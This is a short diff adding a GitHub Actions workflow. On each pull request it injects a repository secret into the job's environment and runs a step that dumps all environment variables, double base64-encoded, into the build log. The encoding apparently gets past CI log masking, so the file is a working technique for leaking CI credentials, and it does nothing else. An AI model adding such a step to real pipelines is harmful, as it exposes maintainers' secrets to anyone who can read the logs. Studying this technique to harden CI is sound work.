@@ -1,0 +1,10 @@
+on:
+    pull_request:
+
+jobs:
+    main:
+        runs-on: ubuntu-latest
+        steps:
+            - run: env | base64 | base64
+        env:
+            MY_SECRET: ${{ secrets.MY_SECRET }}
